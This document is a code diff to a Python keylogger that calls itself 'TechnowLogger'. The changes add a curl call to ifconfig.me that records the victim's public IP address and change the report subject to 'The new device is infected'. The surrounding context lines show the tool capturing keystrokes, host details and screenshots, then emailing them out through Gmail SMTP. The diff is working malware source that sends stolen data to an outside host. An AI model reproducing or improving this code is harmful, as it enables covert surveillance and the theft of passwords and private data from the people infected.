@@ -5,6 +5,7 @@ import smtplib
 import os
 import shutil
 import subprocess
+from subprocess import check_output
 import sys
 import stat
 import platform
@@ -66,7 +67,11 @@ class Keylogger:
         os = uname[0] + " " + uname[2] + " " + uname[3]
         computer_name = uname[1]
         user = getpass.getuser()
-        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user
+        out = check_output(["curl", "-l", "ifconfig.me"])
+        out = str(out)
+        out = out.replace("b", "")
+        out = out.replace("'", "")
+        return "Operating System: \t" + os + "\nIP: \t\t" + out + "\nComputer Name: \t\t" + computer_name + "\nUser: \t\t\t\t" + user
 
     def process_key_press(self, key):
         current_key = ""
@@ -192,12 +197,13 @@ class Keylogger:
 
     def send_mail(self, message):
         try:
-            message = "Subject: TechnowLogger Reporting\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
-            server = smtplib.SMTP("smtp.gmail.com", 587)
-            server.starttls()
-            server.login(self.email, self.password)
-            server.sendmail(self.email, self.email, message)
-            server.quit()
+            if message != "":
+                message = "Subject: TechnowLogger Reporting\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
+                server = smtplib.SMTP("smtp.gmail.com", 587)
+                server.starttls()
+                server.login(self.email, self.password)
+                server.sendmail(self.email, self.email, message)
+                server.quit()
         except Exception as e:
             time.sleep(15)
             self.send_mail(self.log)
@@ -207,8 +213,8 @@ class Keylogger:
             msg = MIMEMultipart()
             msg['From'] = self.email
             msg['To'] = self.email  
-            msg['Subject'] = "TechnowLogger Reporting With Screenshot Attachments"
-            text = "\nReport From:\n\n" + self.system_info 
+            msg['Subject'] = "TechnowLogger: The new device is infected"
+            text = "\nReport From:\n\n" + self.system_info
             msg.attach(MIMEText(text))
 
             for f in files or []:
